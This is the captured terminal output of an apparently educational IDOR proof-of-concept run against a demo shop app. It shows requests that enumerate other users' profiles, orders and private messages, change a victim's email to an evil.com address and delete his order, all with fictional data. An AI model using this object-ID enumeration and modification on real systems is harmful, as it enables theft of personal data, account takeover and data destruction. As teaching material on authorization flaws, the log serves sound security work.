
[91m[1m
â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
â•‘                  IDOR EXPLOIT - POC                         â•‘
â•‘          Insecure Direct Object Reference                   â•‘
â•‘                                                              â•‘
â•‘  Target: SecureShop Web Application                         â•‘
â•‘  Author: Security Research Project                          â•‘
â•‘  Purpose: Educational Demonstration Only                    â•‘
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
[0m

[96m[1m============================================================
  Step 0: Authentication
============================================================[0m

[94m[INFO][0m Authenticating as 'alice'...
[92m[SUCCESS][0m Authenticated successfully as 'alice' (User ID: 1)

[96m[1m============================================================
  Step 1: Profile Enumeration via IDOR
============================================================[0m

[91m[EXPLOIT][0m Attempting to access profiles of ALL users by changing user_id parameter...
  [93mLegitimate request: GET /api/user/1 (own profile)[0m
  [91mMalicious request: GET /api/user/2, /api/user/3, /api/user/4 ...[0m

[93m[DATA][0m User ID 1: {
  "email": "alice@example.com",
  "full_name": "Alice Cohen",
  "id": 1,
  "phone": "050-1234567",
  "role": "user",
  "username": "alice"
}
[93m[DATA][0m User ID 2: {
  "email": "bob@example.com",
  "full_name": "Bob Levi",
  "id": 2,
  "phone": "052-9876543",
  "role": "user",
  "username": "bob"
}
[93m[DATA][0m User ID 3: {
  "email": "charlie@example.com",
  "full_name": "Charlie Admin",
  "id": 3,
  "phone": "054-5555555",
  "role": "admin",
  "username": "charlie"
}
[93m[DATA][0m User ID 4: {
  "email": "david@example.com",
  "full_name": "David Mizrahi",
  "id": 4,
  "phone": "053-1112233",
  "role": "user",
  "username": "david"
}
[94m[INFO][0m User ID 5: Not found (end of enumeration)

  [92m[1mResult: Leaked 4 user profiles![0m
  [92mExposed data: usernames, emails, full names, phone numbers, roles[0m

[96m[1m============================================================
  Step 2: Order Data Theft via IDOR
============================================================[0m

[91m[EXPLOIT][0m Accessing order history of ALL users...
  [93mLegitimate request: GET /api/orders/1 (own orders)[0m
  [91mMalicious request: GET /api/orders/2, /api/orders/3, /api/orders/4 ...[0m

[93m[DATA][0m User ID 1 - Found 4 orders:
    Order #1: Laptop Dell XPS 15 | â‚ª5499.99 | Address: Herzliya, Israel | Card: ****4532
    Order #2: Wireless Mouse | â‚ª199.9 | Address: Herzliya, Israel | Card: ****4532
    Order #7: Laptop Dell XPS 15 | â‚ª5499.99 | Address: Herzliya, Israel | Card: ****4532
    Order #8: Wireless Mouse | â‚ª199.9 | Address: Herzliya, Israel | Card: ****4532
[93m[DATA][0m User ID 2 - Found 4 orders:
    Order #3: iPhone 15 Pro | â‚ª4999.0 | Address: Tel Aviv, Israel | Card: ****8821
    Order #4: AirPods Pro | â‚ª899.0 | Address: Tel Aviv, Israel | Card: ****8821
    Order #9: iPhone 15 Pro | â‚ª4999.0 | Address: Tel Aviv, Israel | Card: ****8821
    Order #10: AirPods Pro | â‚ª899.0 | Address: Tel Aviv, Israel | Card: ****8821
[93m[DATA][0m User ID 3 - Found 2 orders:
    Order #5: MacBook Pro M3 | â‚ª8999.0 | Address: Haifa, Israel | Card: ****1234
    Order #11: MacBook Pro M3 | â‚ª8999.0 | Address: Haifa, Israel | Card: ****1234
[93m[DATA][0m User ID 4 - Found 2 orders:
    Order #6: Samsung Galaxy S24 | â‚ª3799.0 | Address: Beer Sheva, Israel | Card: ****6677
    Order #12: Samsung Galaxy S24 | â‚ª3799.0 | Address: Beer Sheva, Israel | Card: ****6677

  [92m[1mResult: Leaked 12 orders from all users![0m
  [92mExposed data: products, prices, shipping addresses, credit card info[0m

[96m[1m============================================================
  Step 3: Private Message Reading via IDOR
============================================================[0m

[91m[EXPLOIT][0m Reading private messages by iterating message IDs...
  [93mLegitimate request: GET /api/messages/1 (own message)[0m
  [91mMalicious request: GET /api/messages/2, /api/messages/3 ...[0m

[93m[DATA][0m Message #1: From User #3 â†’ To User #1
    Subject: Welcome to the platform
    Body: Hello Alice, welcome to our platform! Your account is ready.
[93m[DATA][0m Message #2: From User #3 â†’ To User #2
    Subject: Welcome to the platform
    Body: Hello Bob, welcome to our platform! Your account is ready.
[93m[DATA][0m Message #3: From User #1 â†’ To User #2
    Subject: Meeting tomorrow
    Body: Hi Bob, can we meet tomorrow at 10am?
[93m[DATA][0m Message #4: From User #2 â†’ To User #1
    Subject: Re: Meeting tomorrow
    Body: Sure Alice, see you then!
[93m[DATA][0m Message #5: From User #3 â†’ To User #4
    Subject: Admin Notice
    Body: David, please update your profile information. - Admin
[93m[DATA][0m Message #6: From User #3 â†’ To User #1
    Subject: Welcome to the platform
    Body: Hello Alice, welcome to our platform! Your account is ready.
[93m[DATA][0m Message #7: From User #3 â†’ To User #2
    Subject: Welcome to the platform
    Body: Hello Bob, welcome to our platform! Your account is ready.
[93m[DATA][0m Message #8: From User #1 â†’ To User #2
    Subject: Meeting tomorrow
    Body: Hi Bob, can we meet tomorrow at 10am?
[93m[DATA][0m Message #9: From User #2 â†’ To User #1
    Subject: Re: Meeting tomorrow
    Body: Sure Alice, see you then!

  [92m[1mResult: Leaked 9 private messages![0m

[96m[1m============================================================
  Step 4: Profile Modification via IDOR
============================================================[0m

[91m[EXPLOIT][0m Attempting to modify Bob's profile (User ID: 2)...
  [93mLegitimate request: PUT /api/user/1 (own profile)[0m
  [91mMalicious request: PUT /api/user/2 (Bob's profile)[0m

[94m[INFO][0m Original email for Bob: bob@example.com
[92m[SUCCESS][0m Successfully modified Bob's profile!
[93m[DATA][0m New email: hacked_bob@evil.com
[93m[DATA][0m New phone: 000-0000000
[94m[INFO][0m (Restored original data for demo purposes)

  [92m[1mResult: Successfully modified another user's profile![0m
  [92mImpact: Account takeover potential via email change[0m

[96m[1m============================================================
  Step 5: Order Deletion via IDOR
============================================================[0m

[91m[EXPLOIT][0m Attempting to delete Bob's order (Order ID: 3)...
  [93mLegitimate request: DELETE /api/orders/1 (own order)[0m
  [91mMalicious request: DELETE /api/orders/3 (Bob's order)[0m

[94m[INFO][0m Bob currently has 4 orders
[92m[SUCCESS][0m Server response: Order 3 deleted successfully
[94m[INFO][0m Bob now has 3 orders (one was deleted!)

  [92m[1mResult: Successfully deleted another user's order![0m
  [92mImpact: Data destruction, business disruption[0m

[96m[1m============================================================
  Step 6: Exploit Summary Report
============================================================[0m


[1mâ•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
â•‘                    EXPLOIT SUMMARY REPORT                    â•‘
â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•£
â•‘                                                              â•‘
â•‘  Attacker:     alice (User ID: 1, Role: user)               â•‘
â•‘  Target:       SecureShop Web Application                    â•‘
â•‘  Timestamp:    2026-02-26 07:17:43                       â•‘
â•‘                                                              â•‘
â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•£
â•‘  VULNERABILITIES EXPLOITED:                                  â•‘
â•‘                                                              â•‘
â•‘  1. Horizontal IDOR - Profile Enumeration                   â•‘
â•‘     â†’ Leaked 4 user profiles (PII data)                  â•‘
â•‘                                                              â•‘
â•‘  2. Horizontal IDOR - Order Data Theft                      â•‘
â•‘     â†’ Leaked 12 orders (payment + address data)           â•‘
â•‘                                                              â•‘
â•‘  3. Horizontal IDOR - Private Message Reading               â•‘
â•‘     â†’ Leaked 9 private messages                        â•‘
â•‘                                                              â•‘
â•‘  4. Object-Level IDOR - Profile Modification                â•‘
â•‘     â†’ Modified another user's email & phone                 â•‘
â•‘                                                              â•‘
â•‘  5. Object-Level IDOR - Order Deletion                      â•‘
â•‘     â†’ Deleted another user's order                          â•‘
â•‘                                                              â•‘
â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•£
â•‘  IMPACT ASSESSMENT:                                          â•‘
â•‘                                                              â•‘
â•‘  Confidentiality: HIGH - All user data exposed              â•‘
â•‘  Integrity:       HIGH - User data can be modified          â•‘
â•‘  Availability:    MEDIUM - Orders can be deleted            â•‘
â•‘  CVSS Score:      8.6 (High)                                â•‘
â•‘                                                              â•‘
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
[0m

[92m[1m[*] All IDOR exploits completed successfully![0m
[93m[*] This demonstrates why proper authorization checks are critical.[0m

